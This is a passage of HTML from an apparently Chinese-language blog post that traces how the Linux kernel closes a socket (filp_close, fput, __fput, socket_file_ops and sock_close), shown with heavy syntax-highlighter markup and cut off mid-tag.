data-line=\"crayon-5bab670f9f931868474179-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f931868474179-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f931868474179-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f931868474179-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f931868474179-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f931868474179-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f931868474179-10\">10</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f9f931868474179-1\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">filp_close</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">struct</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">file *</span><span class=\"crayon-v\">filp</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">fl_owner_t </span><span class=\"crayon-v\">id</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f931868474179-2\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f931868474179-3\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 如果存在flush方法则flush</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f931868474179-4\"><span class=\"crayon-h\">\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">filp</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">f_op</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">filp</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">f_op</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">flush</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f931868474179-5\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">filp</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">f_op</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">flush</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">filp</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">id</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f931868474179-6\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 调用fput\t</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f931868474179-7\"><span class=\"crayon-h\">\t</span><span class=\"crayon-e\">fput</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">filp</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f931868474179-8\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f931868474179-9\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f931868474179-10\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0015 seconds] -->\r\n<p>紧接着我们进入fput:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f9f934582308208\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nvoid fastcall fput(struct file *file)\r\n{\r\n\t// 对应file-&gt;count--,同时检查是否还有关于此file的引用\r\n\t// 如果没有，则调用_fput进行释放\r\n\tif (atomic_dec_and_test(&amp;file-&gt;f_count))\r\n\t\t__fput(file);\r\n}\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f934582308208-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f934582308208-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f934582308208-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f934582308208-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f934582308208-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f934582308208-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f934582308208-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f934582308208-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f9f934582308208-1\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">fastcall </span><span class=\"crayon-e\">fput</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">struct</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">file *</span><span class=\"crayon-v\">file</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f934582308208-2\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f934582308208-3\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 对应file-&gt;count--,同时检查是否还有关于此file的引用</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f934582308208-4\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 如果没有，则调用_fput进行释放</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f934582308208-5\"><span class=\"crayon-h\">\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">atomic_dec_and_test</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">file</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">f_count</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f934582308208-6\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-e\">__fput</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">file</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f934582308208-7\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f934582308208-8\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>同一个file(socket)有多个引用的情况很常见，例如下面的例子:<br>\n<img title=\"在这里输入图片标题\" src=\"http://jbcdn2.b0.upaiyun.com/2018/08/3cc7de4b65a31dd8e0ac5340df2ad4a2.png\" alt=\"输入图片说明\"><br>\n所以在多进程的socket服务器编写过程中，父进程也需要close(fd)一次，以免socket无法最终关闭</p>\n<p>然后就是_fput函数了:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f9f938609433865\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nvoid fastcall __fput(struct file *file)\r\n{\r\n\t// 从eventpoll中释放file\r\n\teventpoll_release(file);\r\n\t// 如果是release方法，则调用release\r\n\tif (file-&gt;f_op &amp;&amp; file-&gt;f_op-&gt;release)\r\n\t\tfile-&gt;f_op-&gt;release(inode, file);\r\n}\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f938609433865-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f938609433865-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f938609433865-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f938609433865-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f938609433865-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f938609433865-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f938609433865-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f938609433865-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f938609433865-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f9f938609433865-1\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">fastcall </span><span class=\"crayon-e\">__fput</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">struct</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">file *</span><span class=\"crayon-v\">file</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f938609433865-2\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f938609433865-3\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 从eventpoll中释放file</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f938609433865-4\"><span class=\"crayon-h\">\t</span><span class=\"crayon-e\">eventpoll_release</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">file</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f938609433865-5\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 如果是release方法，则调用release</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f938609433865-6\"><span class=\"crayon-h\">\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">file</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">f_op</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">file</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">f_op</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">release</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f938609433865-7\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">file</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">f_op</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">release</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">inode</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">file</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f938609433865-8\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f938609433865-9\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p>由于我们讨论的是socket的close,所以，我们现在探查下file-&gt;f_op-&gt;release在socket情况下的实现:</p>\n<h3>f_op-&gt;release的赋值</h3>\n<p>我们跟踪创建socket的代码，即</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f9f93b936700581\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsocket(AF_INET, SOCK_STREAM, 0);\r\n\t|-sock_create  // 创建sock\r\n\t|-sock_map_fd  // 将sock和fd关联\r\n\t\t\t|-sock_attach_fd\r\n\t\t\t\t\t|-init_file(file,...,&amp;socket_file_ops);\r\n\t\t\t\t\t\t\t|-file-&gt;f_op = fop; //fop赋值为socket_file_ops\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f93b936700581-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f93b936700581-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f93b936700581-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f93b936700581-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f93b936700581-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f93b936700581-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f93b936700581-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f9f93b936700581-1\"><span class=\"crayon-e\">socket</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">AF_INET</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">SOCK_STREAM</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f93b936700581-2\"><span class=\"crayon-h\">\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">sock_create</span><span class=\"crayon-h\">  </span><span class=\"crayon-c\">// 创建sock</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f93b936700581-3\"><span class=\"crayon-h\">\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">sock_map_fd</span><span class=\"crayon-h\">  </span><span class=\"crayon-c\">// 将sock和fd关联</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f93b936700581-4\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">sock_attach_fd</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f93b936700581-5\"><span class=\"crayon-h\">\t\t\t\t\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">init_file</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">file</span><span class=\"crayon-sy\">,</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">,</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">socket_file_ops</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f93b936700581-6\"><span class=\"crayon-h\">\t\t\t\t\t\t\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">file</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">f_op</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fop</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//fop赋值为socket_file_ops</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f93b936700581-7\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p>socket_file_ops的实现为:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f9f93e310074807\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nstatic const struct file_operations socket_file_ops = {\r\n\t.owner =\tTHIS_MODULE,\r\n\t......\r\n\t// 我们在这里只考虑sock_close\r\n\t.release =\tsock_close,\r\n\t......\r\n};\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f93e310074807-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f93e310074807-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f93e310074807-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f93e310074807-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f93e310074807-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f93e310074807-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f93e310074807-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f93e310074807-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f9f93e310074807-1\"><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">const</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">struct</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">file_operations </span><span class=\"crayon-v\">socket_file_ops</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f93e310074807-2\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">owner</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\">\t</span><span class=\"crayon-v\">THIS_MODULE</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f93e310074807-3\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f93e310074807-4\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 我们在这里只考虑sock_close</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f93e310074807-5\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">release</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\">\t</span><span class=\"crayon-v\">sock_close</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f93e310074807-6\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f93e310074807-7\"><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f93e310074807-8\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p>继续跟踪:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f9f942391287335\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px 